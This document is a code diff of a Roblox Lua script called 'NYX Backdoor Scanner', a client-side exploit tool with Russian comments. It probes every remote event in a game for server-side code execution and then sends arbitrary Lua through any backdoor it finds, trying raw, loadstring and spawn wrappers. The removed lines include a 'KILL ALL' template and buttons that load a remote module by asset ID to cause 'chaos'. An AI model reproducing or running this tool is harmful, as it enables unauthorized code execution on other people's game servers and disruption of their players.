@@ -330,49 +330,9 @@ G2L["execStatus"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
 G2L["execStatus"]["Font"] = Enum.Font.Code;
 G2L["execStatus"]["TextSize"] = 12;
 
--- ============================================================================
--- НОВЫЕ ЭЛЕМЕНТЫ: ВЫБОР РЕЖИМА И БЫСТРЫЕ КНОПКИ
--- ============================================================================
-
--- Выпадающий список режимов
-G2L["execModeDropdown"] = Instance.new("TextButton", G2L["executorFrame"])
-G2L["execModeDropdown"]["Size"] = UDim2.new(0, 150, 0, 25)
-G2L["execModeDropdown"]["Position"] = UDim2.new(0, 0, 0, 130)
-G2L["execModeDropdown"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30)
-G2L["execModeDropdown"]["Text"] = "MODE: REQUIRE"
-G2L["execModeDropdown"]["TextColor3"] = Color3.fromRGB(0, 255, 0)
-G2L["execModeDropdown"]["Font"] = Enum.Font.Code
-G2L["execModeDropdown"]["TextSize"] = 11
-
--- Шаблоны кода
-G2L["templateDropdown"] = Instance.new("TextButton", G2L["executorFrame"])
-G2L["templateDropdown"]["Size"] = UDim2.new(0, 150, 0, 25)
-G2L["templateDropdown"]["Position"] = UDim2.new(0, 160, 0, 130)
-G2L["templateDropdown"]["BackgroundColor3"] = Color3.fromRGB(30, 30, 30)
-G2L["templateDropdown"]["Text"] = "TEMPLATES ▼"
-G2L["templateDropdown"]["TextColor3"] = Color3.fromRGB(255, 150, 0)
-G2L["templateDropdown"]["Font"] = Enum.Font.Code
-G2L["templateDropdown"]["TextSize"] = 11
-
--- Быстрые кнопки для вашего модуля
-G2L["quickChaos"] = Instance.new("TextButton", G2L["executorFrame"])
-G2L["quickChaos"]["Size"] = UDim2.new(0, 70, 0, 25)
-G2L["quickChaos"]["Position"] = UDim2.new(0, 0, 0, 200)
-G2L["quickChaos"]["BackgroundColor3"] = Color3.fromRGB(100, 0, 0)
-G2L["quickChaos"]["Text"] = "CHAOS"
-G2L["quickChaos"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
-G2L["quickChaos"]["Font"] = Enum.Font.Code
-G2L["quickChaos"]["TextSize"] = 10
-
-G2L["quickAnnounce"] = Instance.new("TextButton", G2L["executorFrame"])
-G2L["quickAnnounce"]["Size"] = UDim2.new(0, 70, 0, 25)
-G2L["quickAnnounce"]["Position"] = UDim2.new(0, 80, 0, 200)
-G2L["quickAnnounce"]["BackgroundColor3"] = Color3.fromRGB(0, 100, 0)
-G2L["quickAnnounce"]["Text"] = "ANNOUNCE"
-G2L["quickAnnounce"]["TextColor3"] = Color3.fromRGB(255, 255, 255)
-G2L["quickAnnounce"]["Font"] = Enum.Font.Code
-G2L["quickAnnounce"]["TextSize"] = 10
-
+--Idk
+warn("This can be copy of original Nyx Scanner! Be Careful")
+ 
 -- ============================================================================
 -- LOGS FRAME
 -- ============================================================================
@@ -406,7 +366,7 @@ G2L["title"] = Instance.new("TextLabel", G2L["2"]);
 G2L["title"]["Size"] = UDim2.new(1, 0, 0, 30);
 G2L["title"]["Position"] = UDim2.new(0, 0, 1, -30);
 G2L["title"]["BackgroundTransparency"] = 1;
-G2L["title"]["Text"] = "NYX BACKDOOR SCANNER ULTIMATE + LUA";
+G2L["title"]["Text"] = "NYX BACKDOOR SCANNER ULTIMATE";
 G2L["title"]["TextColor3"] = Color3.fromRGB(0, 255, 0);
 G2L["title"]["Font"] = Enum.Font.Code;
 G2L["title"]["TextSize"] = 12;
@@ -423,19 +383,20 @@ G2L["close"]["Font"] = Enum.Font.Code;
 G2L["close"]["TextSize"] = 16;
 G2L["close"]["MouseButton1Click"]:Connect(function() G2L["1"]:Destroy() end);
 
--- Dragify
+-- Dragify (ИСПРАВЛЕНО)
 local UIS = game:GetService("UserInputService")
 local dragToggle = false
 local dragStart = nil
 local startPos = nil
 local main = G2L["2"]
 
+-- Создаём прозрачную панель для перетаскивания поверх вкладок
 local dragBar = Instance.new("Frame", main)
 dragBar.Size = UDim2.new(1, 0, 0, 30)
 dragBar.Position = UDim2.new(0, 0, 0, 0)
 dragBar.BackgroundTransparency = 1
 dragBar.Name = "DragBar"
-dragBar.ZIndex = 10
+dragBar.ZIndex = 10 -- Поверх остальных элементов
 
 dragBar.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 then
@@ -459,24 +420,12 @@ UIS.InputChanged:Connect(function(input)
 end)
 
 -- ============================================================================
--- ЛОГИКА (ПОЛНАЯ ПОДДЕРЖКА LUA/LUAU/REQUIRE)
+-- ЛОГИКА
 -- ============================================================================
 local player = game.Players.LocalPlayer
 local backdoor = nil
 local searching = false
 local alphabet = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'}
-
-local ExecMode = { REQUIRE = 1, RAW_LUA = 2, LOADSTRING = 3 }
-local currentMode = ExecMode.REQUIRE
-local modeNames = { [ExecMode.REQUIRE] = "MODE: REQUIRE", [ExecMode.RAW_LUA] = "MODE: RAW LUA", [ExecMode.LOADSTRING] = "MODE: LOADSTRING" }
-
-local templates = {
-    ["PRINT ALL"] = [[for _,v in ipairs(game:GetService("Players"):GetPlayers()) do print(v.Name) end]],
-    ["KILL ALL"] = [[for _,v in ipairs(game:GetService("Players"):GetPlayers()) do if v.Character then v.Character:BreakJoints() end end]],
-    ["SERVER INFO"] = [[print("PlaceId:", game.PlaceId, "JobId:", game.JobId)]],
-    ["REQUIRE CHAOS"] = "require(85345420952288).chaos()",
-    ["REQUIRE ALL"] = "require(85345420952288).loadAll()"
-}
 
 local function addLog(text)
     G2L["logsBox"].Text = G2L["logsBox"].Text .. "[" .. os.date("%H:%M:%S") .. "] " .. text .. "\n"
@@ -498,57 +447,73 @@ local function generateName(len)
     return t
 end
 
--- УЛУЧШЕННАЯ runRemote С ПОДДЕРЖКОЙ LUA/LUAU/REQUIRE
-local function runRemote(remote, data, mode)
-    mode = mode or currentMode
-    
-    if mode == ExecMode.REQUIRE then
+-- ============================================================================
+-- УЛУЧШЕННАЯ runRemote (ПОДДЕРЖКА LUA/LUAU/REQUIRE)
+-- ============================================================================
+local function runRemote(remote, data)
+    -- Если data - число, отправляем как require(ID)
+    if tonumber(data) then
         local id = tonumber(data)
-        if id then
-            local commands = {
-                "require(" .. id .. ").loadAll()",
-                "require(" .. id .. ").chaos()",
-                "require(" .. id .. ").Fire()",
-                "require(" .. id .. ")"
-            }
-            for _, cmd in ipairs(commands) do
-                pcall(function()
-                    if remote:IsA('RemoteEvent') then
-                        remote:FireServer(cmd)
-                    else
-                        remote:InvokeServer(cmd)
-                    end
-                end)
+        local commands = {
+            "require(" .. id .. ").loadAll()",
+            "require(" .. id .. ").chaos()",
+            "require(" .. id .. ").Fire()",
+            "require(" .. id .. ")"
+        }
+        for _, cmd in ipairs(commands) do
+            pcall(function()
+                if remote:IsA('RemoteEvent') then
+                    remote:FireServer(cmd)
+                else
+                    remote:InvokeServer(cmd)
+                end
+            end)
+        end
+        return
+    end
+    
+    -- Если data - строка
+    if type(data) == "string" then
+        -- Пробуем прямой код
+        pcall(function()
+            if remote:IsA('RemoteEvent') then
+                remote:FireServer(data)
+            else
+                remote:InvokeServer(data)
             end
-            return true
-        end
+        end)
+        -- Пробуем loadstring
+        local loadstringWrapped = "loadstring('" .. data:gsub("'", "\\'") .. "')()"
+        pcall(function()
+            if remote:IsA('RemoteEvent') then
+                remote:FireServer(loadstringWrapped)
+            else
+                remote:InvokeServer(loadstringWrapped)
+            end
+        end)
+        -- Пробуем spawn
+        local spawnWrapped = "spawn(function() " .. data .. " end)"
+        pcall(function()
+            if remote:IsA('RemoteEvent') then
+                remote:FireServer(spawnWrapped)
+            else
+                remote:InvokeServer(spawnWrapped)
+            end
+        end)
+        return
     end
     
-    if mode == ExecMode.RAW_LUA then
-        local code = data
-        if remote:IsA('RemoteEvent') then
-            remote:FireServer(code)
-        else
-            spawn(function() remote:InvokeServer(code) end)
-        end
-        return true
+    -- Стандартное поведение
+    if remote:IsA('RemoteEvent') then
+        remote:FireServer(data)
+    elseif remote:IsA('RemoteFunction') then
+        spawn(function() remote:InvokeServer(data) end)
     end
-    
-    if mode == ExecMode.LOADSTRING then
-        local wrapped = "loadstring('" .. data:gsub("'", "\\'") .. "')()"
-        if remote:IsA('RemoteEvent') then
-            remote:FireServer(wrapped)
-        else
-            spawn(function() remote:InvokeServer(wrapped) end)
-        end
-        return true
-    end
-    
-    return false
 end
 
--- Сканер бэкдоров (ОРИГИНАЛЬНЫЙ)
+-- Сканер бэкдоров (НЕ ТРОНУТ)
 local function findRemote()
+    local timee = os.clock()
     local remotes = {}
     
     for _, remote in ipairs(game:GetDescendants()) do
@@ -561,13 +526,7 @@ local function findRemote()
             local code = generateName(math.random(12, 30))
             while remotes[code] do code = generateName(math.random(12, 30)) end
             
-            pcall(function()
-                if remote:IsA('RemoteEvent') then
-                    remote:FireServer("a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
-                else
-                    remote:InvokeServer("a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
-                end
-            end)
+            runRemote(remote, "a=Instance.new('Model',workspace)a.Name='" .. code .. "'")
             remotes[code] = remote
         end
     end
@@ -587,7 +546,7 @@ local function findRemote()
     return false
 end
 
--- Source Scan (ОРИГИНАЛЬНЫЙ)
+-- Source Scan (НЕ ТРОНУТ)
 local function sourceScan()
     local found = {}
     local dangerous = {"require", "loadstring", "getfenv", "setfenv", "http_request", "syn.request", "HttpService", "webhook", "discord.com/api"}
@@ -618,7 +577,7 @@ local function sourceScan()
     end
 end
 
--- Переключение вкладок
+-- Переключение вкладок (НЕ ТРОНУТО)
 local tabs = {
     {btn = G2L["scanTab"], frame = G2L["scannerFrame"]},
     {btn = G2L["sourceTab"], frame = G2L["sourceFrame"]},
@@ -638,69 +597,11 @@ for _, tab in ipairs(tabs) do
         tab.btn.TextColor3 = Color3.fromRGB(255, 255, 255)
     end)
 end
-
--- Режимы
-G2L["execModeDropdown"].MouseButton1Click:Connect(function()
-    currentMode = currentMode + 1
-    if currentMode > ExecMode.LOADSTRING then
-        currentMode = ExecMode.REQUIRE
-    end
-    G2L["execModeDropdown"].Text = modeNames[currentMode]
-end)
-
--- Шаблоны
-local templateList = Instance.new("Frame", G2L["executorFrame"])
-templateList.Size = UDim2.new(0, 150, 0, 150)
-templateList.Position = UDim2.new(0, 160, 0, 155)
-templateList.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-templateList.BorderSizePixel = 1
-templateList.Visible = false
-
-G2L["templateDropdown"].MouseButton1Click:Connect(function()
-    templateList.Visible = not templateList.Visible
-end)
-
-local yPos = 0
-for name, code in pairs(templates) do
-    local btn = Instance.new("TextButton", templateList)
-    btn.Size = UDim2.new(1, 0, 0, 20)
-    btn.Position = UDim2.new(0, 0, 0, yPos)
-    btn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    btn.Text = name
-    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
-    btn.Font = Enum.Font.Code
-    btn.TextSize = 10
-    
-    btn.MouseButton1Click:Connect(function()
-        G2L["scriptBox"].Text = code
-        templateList.Visible = false
-    end)
-    
-    yPos = yPos + 20
-end
-
--- Быстрые кнопки
-G2L["quickChaos"].MouseButton1Click:Connect(function()
-    if backdoor then
-        runRemote(backdoor, "85345420952288", ExecMode.REQUIRE)
-        G2L["execStatus"].Text = "Sent: require(85345420952288).chaos()"
-        addLog("Quick action: CHAOS")
-    else
-        G2L["execStatus"].Text = "No backdoor! Scan first."
-    end
-end)
-
-G2L["quickAnnounce"].MouseButton1Click:Connect(function()
-    if backdoor then
-        runRemote(backdoor, "85345420952288", ExecMode.REQUIRE)
-        G2L["execStatus"].Text = "Sent: require(85345420952288).loadAll()"
-        addLog("Quick action: ANNOUNCE")
-    else
-        G2L["execStatus"].Text = "No backdoor! Scan first."
-    end
-end)
-
--- Кнопки (ОРИГИНАЛЬНЫЕ)
+ 
+ --Idk
+warn("This can be copy of original Nyx Scanner! Be Careful")
+ 
+-- Кнопки (НЕ ТРОНУТЫ, кроме execBtn где теперь работает улучшенная runRemote)
 G2L["scanBtn"].MouseButton1Click:Connect(function()
     if searching then return end
     searching = true
@@ -735,9 +636,9 @@ G2L["execBtn"].MouseButton1Click:Connect(function()
     code = string.gsub(code, "%%username%%", player.Name)
     
     if backdoor then
-        runRemote(backdoor, code, currentMode)
-        G2L["execStatus"].Text = "Executed! (" .. modeNames[currentMode] .. ")"
-        addLog("Script executed (" .. modeNames[currentMode] .. ")")
+        runRemote(backdoor, code) -- Теперь поддерживает и числа, и Lua, и loadstring
+        G2L["execStatus"].Text = "Executed!"
+        addLog("Script executed")
     else
         G2L["execStatus"].Text = "No backdoor! Scan first."
     end
@@ -762,13 +663,14 @@ G2L["clearLogsBtn"].MouseButton1Click:Connect(function()
 end)
 
 -- Init
-addLog("NYX Scanner + LUA loaded")
+addLog("NYX Scanner loaded")
 addLog("Game: " .. game.PlaceId)
 addLog("Player: " .. player.Name)
-notify("NYX Scanner Ultimate + LUA loaded!")
+notify("NYX Scanner Ultimate loaded!")
 
 print("========================================")
-print("NYX BACKDOOR SCANNER ULTIMATE + LUA LOADED!")
+warn("This can be copy of original Nyx Scanner! Be Careful")
+print("NYX BACKDOOR SCANNER ULTIMATE LOADED!")
 print("========================================")
 
 end -- Конец loadScanner()
